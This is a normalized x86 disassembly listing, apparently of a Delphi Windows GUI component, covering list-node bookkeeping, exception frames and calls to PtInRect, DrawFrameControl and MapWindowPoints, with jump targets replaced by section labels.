test eax eax
je r-xdata
mov edx [ esi + 0x68 ]
mov eax ebx
call sub_45748c
mov eax [ esi + 0x64 ]
call sub_457464
mov [ esi + 0x68 ] eax
mov al [ ebp + 0xc ]
mov [ esi + 0x48 ] al
xor eax eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x44 ] 0x3fe00000
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
test eax eax
je r-xdata
mov [ eax + 0xc ] ebx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0x18 ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_458b34
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_457818
mov eax [ esi + 0x64 ]
call sub_457464
sar eax 0x1
jns r-xdata
mov eax [ esi + 0x64 ]
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x64 ]
mov [ eax + 0x14 ] ebx
mov edx [ ebp - 0x4 ]
mov [ eax + 0xc ] edx
mov edx [ ebp - 0x4 ]
mov [ edx + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ esi + 0x64 ] ebx
push esi
push sub_458b34
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_457818
jmp r-xdata
mov eax [ ebx + 0x14 ]
cmp edi [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0x18 ] ebx
mov [ esi + 0x4c ] eax
push esi
push sub_458eb8
mov edx [ ebx + 0x8 ]
mov eax esi
call sub_457818
mov eax [ esi + 0x64 ]
call sub_457464
mov edx eax
sar edx 0x1
jns r-xdata
adc eax 0x0
push esi
push sub_458fec
xor edx edx
mov eax esi
call sub_457818
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x14 ] ebx
mov [ edi + 0x14 ] ebx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov [ eax + 0x8 ] ebx
mov eax [ ebp - 0x4 ]
call sub_45748c
adc edx 0x0
mov eax ebx
call sub_45714c
mov eax ebx
call sub_4574dc
push esi
push sub_458fec
xor edx edx
mov eax esi
call sub_457818
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x8
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0xc ] edi
mov [ ebx + 0x8 ] edi
xor eax eax
mov [ edi + 0x18 ] eax
mov eax [ ebp - 0x4 ]
mov [ edi + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov [ eax + 0x18 ] edi
jmp r-xdata
sub_457c6c
push ebp
mov ebp esp
push ebx
mov ebx ecx
mov ecx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
test cl cl
je r-xdata
mov eax [ eax + 0x64 ]
mov ebx [ eax + 0x8 ]
test cl cl
je r-xdata
mov [ edx + 0xc ] ebx
mov eax [ ebx + 0x18 ]
mov [ edx + 0x18 ] eax
test eax eax
je r-xdata
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
mov [ edx + 0x18 ] ebx
mov eax [ ebx + 0xc ]
mov [ edx + 0xc ] eax
test eax eax
je r-xdata
jmp r-xdata
mov [ ebx + 0x18 ] edx
mov eax [ ebx + 0x14 ]
mov [ edx + 0x14 ] eax
cmp ebx [ eax + 0x8 ]
jne r-xdata
mov [ eax + 0xc ] edx
mov [ ebx + 0xc ] edx
jmp r-xdata
mov [ eax + 0x18 ] edx
mov eax [ ebx + 0xc ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x14 ]
call sub_45714c
mov eax [ ebx + 0x14 ]
call sub_4574dc
pop ebx
pop ebp
retn 0x4
mov [ eax + 0x8 ] edx
mov ebx eax
sub_457ce4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x1
jne r-xdata
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x10 ] 0x2
jne r-xdata
mov eax ebx
call sub_457464
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jl r-xdata
cmp [ ebx + 0x4 ] 0x0
je r-xdata
mov eax ebx
call sub_457464
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jl r-xdata
mov eax ebx
call sub_457464
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov edx 0x1
mov eax ebx
call sub_457030
mov esi eax
mov edx 0x2
mov eax ebx
call sub_457030
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
mov eax ebx
call sub_457464
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub eax [ edx + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x10 ] 0x0
jne r-xdata
mov eax ebx
call sub_45753c
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x12
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov eax ebx
call sub_457564
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_45753c
call sub_457ce4
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add edi [ edx + 0x18 ]
cmp eax edi
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add esi [ edx + 0x18 ]
cmp eax esi
jg r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_457564
call sub_457ce4
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jg r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jg r-xdata
mov edx 0x1
mov eax ebx
call sub_45709c
add esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp esi [ eax + 0x4 ]
jl r-xdata
mov edx 0x2
mov eax ebx
call sub_45709c
add edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edi [ eax ]
jl r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x4 ]
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0x44 ]
add edx 0xf
cmp eax edx
jge r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax - 0x10 ] ebx
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
sub edx 0xf
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp edx [ eax ]
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x2
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0xc ]
mov [ eax ] 0x14
jmp r-xdata
sub_457f10
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
call sub_451de4
mov esi eax
dec esi
cmp esi 0x0
jl r-xdata
xor ebx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx esi
call sub_451da8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
dec esi
cmp esi 0xffffffff
jne r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4034a8
test al al
je r-xdata
mov edx [ edi + 0x4 ]
sub edx [ ebx + 0x44 ]
mov eax [ edi ]
sub eax [ ebx + 0x40 ]
lea ecx [ ebp - 0x8 ]
call sub_417644
push [ ebp - 0x4 ]
push [ ebp - 0x8 ]
lea edx [ ebp - 0x18 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ ebp - 0x18 ]
push eax
call PtInRect
test eax eax
jne r-xdata
cmp [ ebx + 0x1a6 ] 0x0
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_457fa4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
mov [ ebp - 0x10 ] eax
mov eax [ ebp - 0xc ]
xor edx edx
mov [ eax ] edx
push ebp
mov eax [ ebp - 0x4 ]
call sub_457f10
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_457564
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
cmp eax [ ebx + 0xa0 ]
jne r-xdata
mov eax [ ebp - 0x10 ]
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
jne r-xdata
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_4577b0
mov [ ebp - 0x10 ] eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x64 ]
call sub_457564
call sub_457ce4
pop ecx
mov eax [ ebp - 0xc ]
mov [ eax ] 0x1
jmp r-xdata
sub_45802c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_404118
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
mov esi [ eax ]
call [ esi + 0xc ]
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax ebx
mov edx [ ebp - 0x4 ]
call sub_404764
mov edx [ ebx ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
sub_458074
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_45826c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x64 ]
mov eax [ ebp - 0x8 ]
call sub_458744
mov eax [ ebp - 0x8 ]
call sub_457740
xor edx edx
push ebp
push sub_45824f
push [ fs : edx ]
mov [ fs : edx ] esp
lea edx [ ebp - 0x1c ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
lea edx [ ebp - 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov edi [ ebp - 0x20 ]
dec edi
test edi edi
jl r-xdata
mov eax [ ebp - 0x8 ]
lea edx [ eax + 0x68 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
mov [ ebp - 0x18 ] eax
xor esi esi
inc edi
mov [ ebp - 0x1c ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458256
mov eax [ ebp - 0x8 ]
call sub_457744
retn
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_456f18
mov ebx eax
lea edx [ ebx + 0x10 ]
mov ecx 0x1
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
lea edx [ ebx + 0x20 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0xc ]
push ebp
lea eax [ ebp - 0xc ]
call sub_45802c
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
lea ecx [ ebp - 0x10 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov edx [ ebp - 0xc ]
mov si 0xffb9
call sub_403518
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_457238
test al al
jne r-xdata
push ebp
lea eax [ ebp - 0xc ]
call sub_45802c
pop ecx
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor edx edx
mov eax [ ebp - 0x10 ]
call sub_44e7d4
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x14 ]
xor ecx ecx
mov eax [ ebp - 0x10 ]
call sub_44f5cc
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax + 0x64 ] ebx
jmp r-xdata
mov eax ebx
call sub_40331c
jmp r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jle r-xdata
mov [ esi + 0xc ] ebx
mov [ ebx + 0x18 ] esi
mov eax [ esi + 0x14 ]
mov [ ebx + 0x14 ] eax
jmp r-xdata
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
mov esi ebx
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov ecx 0x4
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov eax [ ebp - 0x14 ]
cmp eax [ rw-data ]
je r-xdata
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x18 ]
jge r-xdata
mov [ esi + 0x8 ] ebx
mov [ ebx + 0x14 ] esi
jmp r-xdata
mov eax esi
mov edi [ ebp - 0x18 ]
sub edi [ ebp - 0x14 ]
test edi edi
jle r-xdata
mov [ eax + 0xc ] ebx
mov [ ebx + 0x18 ] eax
mov eax [ eax + 0x14 ]
mov [ ebx + 0x14 ] eax
mov [ ebp - 0x1c ] 0x1
mov eax [ eax + 0x14 ]
inc [ ebp - 0x1c ]
dec edi
jne r-xdata
sub_45827c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push 0x0
push 0x1
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x8 ]
mov edi [ eax + 0x18 ]
mov eax edi
add eax esi
sub eax 0x2
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx edi
add ecx ebx
sub ecx 0x2
mov edx esi
mov eax ebx
call sub_41766c
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_425acc
push eax
call DrawFrameControl
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4582d4
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov edi eax
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000014
call sub_424fec
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx esi
call sub_425748
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx ebx
mov edx edi
call sub_4256e8
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx edi
call sub_4256e8
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x10 ]
mov edx 0xff000010
call sub_424fec
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov edx esi
call sub_4256e8
mov ecx ebx
dec ecx
mov eax [ ebp + 0xc ]
mov eax [ eax - 0x4 ]
mov edx esi
call sub_4256e8
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
sub_45835c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov [ ebp - 0x4 ] edx
mov [ ebp - 0x8 ] eax
mov ebx [ ebp + 0x8 ]
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x14 ]
mov al [ eax + 0x5b ]
dec eax
sub al 0x2
jae r-xdata
push ebp
mov eax [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub eax [ edx + 0x18 ]
inc eax
mov edx [ ebx + 0x4 ]
inc edx
call sub_45827c
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x5
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x3
mov eax [ ebx ]
add eax 0x2
call sub_4582d4
pop ecx
push ebp
mov eax [ ebx + 0x4 ]
mov edx eax
add edx 0x8
push edx
mov ecx [ ebx + 0x8 ]
mov edx [ ebp - 0x8 ]
sub ecx [ edx + 0x18 ]
sub ecx 0x2
mov edx eax
add edx 0x6
mov eax [ ebx ]
add eax 0x2
call sub_4582d4
pop ecx
push ebp
mov edx [ ebx + 0x4 ]
inc edx
mov eax [ ebx ]
inc eax
call sub_45827c
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x5
add eax 0x3
call sub_4582d4
pop ecx
push ebp
mov edx [ ebx + 0xc ]
sub edx 0x2
push edx
mov edx [ ebx + 0x4 ]
mov ecx [ ebp - 0x8 ]
add edx [ ecx + 0x18 ]
inc edx
mov eax [ ebx ]
mov ecx eax
add ecx 0x8
add eax 0x6
call sub_4582d4
pop ecx
jmp r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_458438
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42541c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_45858e
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ esi + 0x14 ]
mov eax [ ebp - 0x4 ]
call sub_44d490
mov eax [ ebp - 0x4 ]
call sub_425720
xor eax eax
push ebp
push sub_458571
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_425b4c
xor eax eax
push ebp
push sub_458554
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi + 0x14 ]
call sub_451de4
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45855b
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_425b4c
retn
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
mov eax [ ebx + 0xa0 ]
cmp eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_451da8
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_44e254
lea ecx [ ebp - 0x1c ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi ]
mov eax [ ebp - 0x1c ]
sub eax [ ebx + 0x40 ]
add eax eax
sub [ ebp - 0x1c ] eax
mov eax [ ebp - 0x18 ]
sub eax [ ebx + 0x44 ]
add eax eax
sub [ ebp - 0x18 ] eax
mov eax [ ebx + 0x48 ]
mov edx [ ebp - 0x14 ]
sub edx [ ebp - 0x1c ]
sub eax edx
add eax eax
sub [ ebp - 0x14 ] eax
mov eax [ ebx + 0x4c ]
mov edx [ ebp - 0x10 ]
sub edx [ ebp - 0x18 ]
sub eax edx
add eax eax
sub [ ebp - 0x10 ] eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx ebx
mov edx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
sub_45859c
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
push edi
mov ebx ecx
mov esi eax
mov eax [ esi + 0x14 ]
call sub_453be4
mov edi eax
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
call sub_44e2fc
push eax
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x14 ]
call sub_44e2b8
mov ecx eax
xor edx edx
xor eax eax
call sub_41766c
mov eax [ ebp + 0x8 ]
push esi
push edi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop edi
pop esi
test edi edi
jle r-xdata
cmp [ ebx + 0x9c ] 0x0
je r-xdata
push 0x2
mov eax [ ebp + 0x8 ]
push eax
push 0x0
mov eax [ esi + 0x14 ]
call sub_4550b4
push eax
call MapWindowPoints
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov al [ ebp + 0xc ]
dec al
je r-xdata
cmp edi 0x2
jge r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx + 0x44 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebx + 0x48 ]
mov edi eax
mov edx [ ebx + 0x4c ]
mov [ ebp - 0xc ] edx
mov dl [ ebp + 0xc ]
add dl 0xfd
sub dl 0x2
jae r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0xc ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
dec eax
sub al 0x2
jae r-xdata
mov edi eax
sar edi 0x1
jns r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x4 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
dec al
je r-xdata
mov al [ ebp + 0xc ]
sub al 0x2
je r-xdata
mov eax [ ebx + 0x4c ]
sar eax 0x1
jns r-xdata
adc edi 0x0
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov [ edx + 0x8 ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
sar eax 0x1
jns r-xdata
jmp r-xdata
mov eax [ ebp - 0xc ]
add [ ebp - 0x8 ] eax
sub al 0x2
jne r-xdata
mov [ ebp - 0xc ] eax
adc eax 0x0
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
adc eax 0x0
mov eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x1c ]
push eax
mov ecx edi
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_417694
mov eax [ ebp + 0x8 ]
push esi
lea esi [ ebp - 0x1c ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
add [ ebp - 0x4 ] edi
jmp r-xdata
sub_458710
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov edx [ ebp + 0x8 ]
push edx
call sub_458710
pop ecx
mov eax ebx
call sub_40331c
pop ebx
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
call sub_458710
pop ecx
sub_458744
push ebp
mov ebp esp
push ebx
push esi
mov ebx edx
mov esi eax
test ebx ebx
je r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax [ ebx + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
je r-xdata
push ebp
call sub_458710
pop ecx
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
jmp r-xdata
mov eax [ ebx + 0xc ]
test eax eax
je r-xdata
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
cmp ebx [ esi + 0x64 ]
jne r-xdata
mov edx [ ebx + 0x18 ]
mov [ eax + 0x18 ] edx
mov eax ebx
call sub_40331c
xor eax eax
mov [ esi + 0x64 ] eax
sub_4587a0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4577b0
test eax eax
je r-xdata
pop esi
pop ebx
retn
cmp eax [ ebx + 0x38 ]
jne r-xdata
mov edx eax
mov eax ebx
call sub_4587dc
xor edx edx
mov [ eax + 0x4 ] edx
jmp r-xdata
mov [ esi + 0x9c ] 0x0
mov eax [ ebx + 0x14 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_4587dc
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_458a49
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
jne r-xdata
cmp [ ebx + 0x4 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405f7c
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405f7c
mov edx [ ebp - 0x8 ]
pop eax
call sub_4043e0
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
mov eax [ ebx + 0x14 ]
call sub_456f3c
cmp eax 0x1
jne r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405f7c
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405f7c
mov edx [ ebp - 0x10 ]
pop eax
call sub_4043e0
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40bd8c
call sub_403ad0
cmp eax 0x2
jne r-xdata
mov eax [ esi + 0x64 ]
xor edx edx
mov [ eax + 0x8 ] edx
mov [ eax + 0x10 ] 0x0
jmp r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax [ ebx + 0x18 ]
test eax eax
jne r-xdata
mov eax ebx
call sub_40331c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_458a50
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_40413c
retn
mov edx [ ebx + 0xc ]
mov [ eax + 0xc ] edx
mov edx [ ebx + 0xc ]
test edx edx
je r-xdata
mov eax [ ebx + 0x14 ]
mov edx [ ebx + 0xc ]
mov [ eax + 0x8 ] edx
mov eax [ ebx + 0xc ]
xor edx edx
mov [ eax + 0x18 ] edx
call sub_4572ec
jmp r-xdata
mov edi eax
mov edi [ ebx + 0xc ]
jmp r-xdata
mov eax ebx
call sub_457464
mov edx eax
mov eax [ ebx + 0x18 ]
call sub_4574a0
mov eax [ ebx + 0x18 ]
call sub_4572ec
mov [ edx + 0x18 ] eax
push esi
push sub_458fec
mov edx [ ebx + 0x14 ]
mov eax esi
call sub_457818
mov eax [ ebx + 0x14 ]
cmp eax [ esi + 0x64 ]
jne r-xdata
mov edx [ esi + 0x64 ]
mov eax [ ebx + 0x14 ]
cmp edx eax
jne r-xdata
cmp [ edi + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x14 ]
mov eax [ eax + 0x18 ]
mov edx [ edi + 0x8 ]
mov [ edx + 0x18 ] eax
test eax eax
jne r-xdata
mov edx [ esi + 0x68 ]
mov eax edi
call sub_4574a0
mov eax [ esi + 0x64 ]
call sub_457464
mov [ esi + 0x68 ] eax
mov eax [ esi + 0x64 ]
call sub_40331c
mov [ esi + 0x64 ] edi
xor eax eax
mov [ edi + 0xc ] eax
xor eax eax
mov [ edi + 0x18 ] eax
xor eax eax
mov [ edi + 0x14 ] eax
mov eax esi
call sub_458fc4
jmp r-xdata
mov [ eax + 0x10 ] 0x0
mov edx [ edi + 0x4 ]
mov [ eax + 0x4 ] edx
